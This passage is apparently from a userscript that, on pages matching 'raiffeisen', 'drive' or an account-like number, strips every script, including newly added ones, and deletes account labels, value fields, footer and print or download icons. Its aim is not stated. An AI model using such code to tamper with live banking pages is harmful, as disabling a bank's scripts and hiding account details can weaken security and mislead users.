    // Remove all scripts, add-month elements, print icon elements, download icon elements, legend elements, elements with uisref="v2.l.view", elements with aria-labelledby="presentation-icon", elements with class "light" under parent with labelledby="label-konto", elements with class "span8 text-left margin-tiny-top", and elements with class "flip-container" from the document
    removeScripts();
    removeAddMonthElements();
    removePrintIcon();
    removeDownloadIcon();
    removeLegendElements();
    removeUisrefElements();
    removePresentationIconElements();
    removeLightElements();
    removeSpan8TextLeftElements();
    removeFlipContainerElements();
}


//=============================================================================================================================================================
//=============================================================================================================================================================
//=============================================================================================================================================================



if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "light" under elements with aria-labelledby="label_belastungskonto"
    function removeLightElements() {
        console.log("Removing elements with class 'light' under elements with aria-labelledby='label_belastungskonto'...");
        var elements = document.querySelectorAll('[aria-labelledby="label_belastungskonto"] .light');
        elements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove the element with class "footer additonal visible-desktop visible-tablet"
    function removeFooterElement() {
        console.log("Removing element with class 'footer additonal visible-desktop visible-tablet'...");
        var footerElement = document.querySelector('.footer.additonal.visible-desktop.visible-tablet');
        if (footerElement) {
            footerElement.remove();
            console.log("Element removed.");
        }
    }

    // Function to remove elements with class "value" under elements with class "row-fluid margin-large"
    function removeValueElements() {
        console.log("Removing elements with class 'value' under elements with class 'row-fluid margin-large'...");
        var elements = document.querySelectorAll('.row-fluid.margin-large .value');
        elements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, elements with class "light", the footer element, and "value" elements
    var zsobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        removeScripts();
                    }
                }
            }
        }
        removeLightElements();
        removeFooterElement();
        removeValueElements();
    });

    // Start observing the document
    zsobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts, elements with class "light", the footer element, and "value" elements
    removeScripts();
    removeLightElements();
    removeFooterElement();
    removeValueElements();
}


